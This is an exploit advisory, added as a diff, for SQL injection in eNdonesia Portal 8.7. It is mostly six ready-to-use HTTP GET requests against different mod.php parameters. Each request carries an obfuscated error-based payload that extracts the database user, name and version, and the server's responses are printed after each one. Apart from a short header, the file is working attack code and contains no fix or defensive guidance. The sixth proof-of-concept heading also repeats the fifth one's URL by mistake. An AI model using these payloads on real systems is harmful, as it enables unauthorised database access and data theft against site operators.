@@ -1,0 +1,154 @@
+# Exploit Title: eNdonesia Portal 8.7 - 'artid' SQL Injection
+# Dork: N/A
+# Date: 2018-10-21
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.endonesia.org/
+# Software Link: https://sourceforge.net/projects/endonesia/files/latest/download
+# Version: 8.7
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/mod.php?mod=publisher&op=viewarticle&artid=[SQL]
+
+GET /[PATH]/mod.php?mod=publisher&op=viewarticle&artid=12%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 21 Oct 2018 01:04:32 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=6u88omoqt8ieul6oug7laekag5; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/mod.php?mod=publisher&op=viewcat&cid=[SQL]
+ 
+GET /[PATH]/mod.php?mod=publisher&op=viewcat&cid=4%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=6u88omoqt8ieul6oug7laekag5
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 21 Oct 2018 01:08:12 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 7597
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/mod.php?mod=diskusi&op=viewdisk&did=[SQL]
+ 
+GET /[PATH]/mod.php?mod=diskusi&op=viewdisk&did=4%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=6u88omoqt8ieul6oug7laekag5
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 21 Oct 2018 01:12:43 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 5777
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 4)
+# http://localhost/[PATH]/mod.php?mod=galeri&op=view_album&cid=[SQL]
+ 
+GET /[PATH]/mod.php?mod=galeri&op=view_album&cid=5%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=6u88omoqt8ieul6oug7laekag5
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 21 Oct 2018 01:16:24 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 4671
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 5)
+# http://localhost/[PATH]/mod.php?mod=content&op=viewcontent&contid=[SQL]
+
+GET /[PATH]/mod.php?mod=content&op=viewcontent&contid=11%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=6u88omoqt8ieul6oug7laekag5
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 21 Oct 2018 01:19:14 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 4644
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 6)
+# http://localhost/[PATH]/mod.php?mod=content&op=viewcontent&contid=[SQL]
+ 
+GET /[PATH]/mod.php?mod=about&op=viewabout&aboutid=1%27||(SELEct%20%27Efe%27%20FRom%20DUal%20WHERE%20113=113%20anD%20(SeleCT%20156%20FRom(SElecT%20CouNT(*),coNcaT(CONCat(0x203a20,USeR(),DatABAse(),verSIoN()),(SEleCT%20(Elt(156=156,1))),FLooR(RAnd(0)*2))x%20frOM%20InFORmaTION_SCHemA.PLugiNS%20GRouP%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=6u88omoqt8ieul6oug7laekag5
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 21 Oct 2018 01:23:41 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 7072
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
